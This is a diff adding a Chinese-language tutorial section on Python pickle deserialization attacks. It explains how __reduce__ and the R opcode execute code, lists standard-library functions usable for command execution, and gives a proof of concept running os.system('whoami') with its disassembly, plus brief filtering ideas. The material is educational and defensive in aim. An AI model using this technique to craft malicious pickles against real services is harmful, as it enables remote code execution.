@@ -204,7 +204,94 @@ tR.
 
 ### 1. \_\_reduce__
 
+>IMPORTANT: **__reduce__的opcode为`R`**
+
 ![pic](./python_pickle_img/reduce.png)
+
+在pickle反序列化的过程中，class的__reduce__方法会被自动调用，且
+
+- 取当前栈的栈顶记为args，然后把它弹掉
+- 取当前栈的栈顶记为f，然后把它弹掉
+- 以`args`为参数，执行函数`f`，把结果压进当前栈
+
+我们可以利用`__reduce__`构造恶意字符串，当这个字符串被反序列化的时候，__reduce__会`被执行`
+
+> pickle.loads是会解决import问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用
+
+这里给出Bendawang师傅总结的可利用的函数
+
+```text
+eval, execfile, compile, open, file, map, input,
+os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,
+os.listdir, os.access,
+os.execl, os.execle, os.execlp, os.execlpe, os.execv,
+os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,
+os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,
+pickle.load, pickle.loads,cPickle.load,cPickle.loads,
+subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,
+commands.getstatusoutput,commands.getoutput,commands.getstatus,
+glob.glob,
+linecache.getline,
+shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,
+dircache.listdir,dircache.opendir,
+io.open,
+popen2.popen2,popen2.popen3,popen2.popen4,
+timeit.timeit,timeit.repeat,
+sys.call_tracing,
+code.interact,code.compile_command,codeop.compile_command,
+pty.spawn,
+posixfile.open,posixfile.fileopen,
+platform.popen
+```
+
+#### 示例
+
+```python
+import pickle
+import pickletools
+
+class Person(object):
+    def __init__(self, username, password):
+        self.username = username
+        self.password = password
+
+    def __reduce__(self):
+        return (__import__('os').system, ('whoami', ))
+
+admin = Person('admin', '123456')
+result = pickle.dumps(admin, 4)
+
+print(result)
+user = pickle.loads(result)
+```
+
+```text
+输出:
+b'\x80\x04\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
+root
+
+pickletools:
+ 0: \x80 PROTO      4
+ 2: \x95 FRAME      27
+11: \x8c SHORT_BINUNICODE 'posix'
+18: \x8c SHORT_BINUNICODE 'system'
+26: \x93 STACK_GLOBAL
+27: \x8c SHORT_BINUNICODE 'whoami'
+35: \x85 TUPLE1
+36: R    REDUCE
+37: .    STOP
+```
+
+#### 一些过滤
+
+可以看到__reduce__的标志十分明显，只要对`R`及其涉及的函数进行限制即可。这里介绍几种过滤及绕过方法
+
+1. import 白名单
+2. 过滤 R
+
+### 全局变量覆盖
+
+> 剩下的可以查看这篇文章 <http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/>
 
 ## 参考链接
 
@@ -213,3 +300,4 @@ tR.
 [anquanke -- Python pickle 反序列化实例分析](https://www.anquanke.com/post/id/188981)
 [1FONLY -- 初探Python反序列化学习笔记](https://ifonlyddw.gitee.io/posts/20200308/#toc-heading-5)
 [Bendawang -- Python反序列化漏洞的花式利用](http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/)
+[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势](https://zhuanlan.zhihu.com/p/89132768)
